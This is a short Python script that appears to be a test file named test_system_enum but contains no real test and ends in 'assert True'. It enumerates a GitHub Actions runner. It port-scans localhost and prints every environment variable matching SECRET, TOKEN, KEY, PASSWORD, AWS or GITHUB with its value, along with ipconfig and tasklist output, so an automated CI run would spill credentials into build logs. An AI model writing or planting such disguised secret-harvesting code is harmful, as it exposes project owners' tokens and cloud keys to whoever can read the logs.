#!/usr/bin/env python3
import socket
import subprocess
import os

def test_system_enum():
    print("\n=== GITHUB ACTIONS SYSTEM ENUMERATION ===")
    
    # Port scan
    print("\n[PORT SCAN]")
    for port in [22, 80, 443, 3306, 5432, 8080]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex(('127.0.0.1', port))
            if result == 0:
                print(f"PORT {port} OPEN")
            sock.close()
        except:
            pass
    
    # Environment variables
    print("\n[ENVIRONMENT VARIABLES]")
    for key, value in os.environ.items():
        if any(k in key.upper() for k in ['SECRET', 'TOKEN', 'KEY', 'PASSWORD', 'AWS', 'GITHUB']):
            print(f"ENV: {key}={value}")
    
    # System info
    print(f"\n[SYSTEM INFO]")
    print(f"OS: {os.name}")
    print(f"CWD: {os.getcwd()}")
    print(f"USER: {os.environ.get('USERNAME', 'unknown')}")
    
    # Network interfaces (Windows)
    try:
        result = subprocess.run(['ipconfig'], capture_output=True, text=True, timeout=5)
        print(f"\n[NETWORK CONFIG]")
        print(result.stdout[:1000])
    except:
        pass
    
    # Running processes (Windows)
    try:
        result = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=5)
        print(f"\n[PROCESSES]")
        print(result.stdout[:1000])
    except:
        pass
    
    assert True

if __name__ == "__main__":
    test_system_enum()
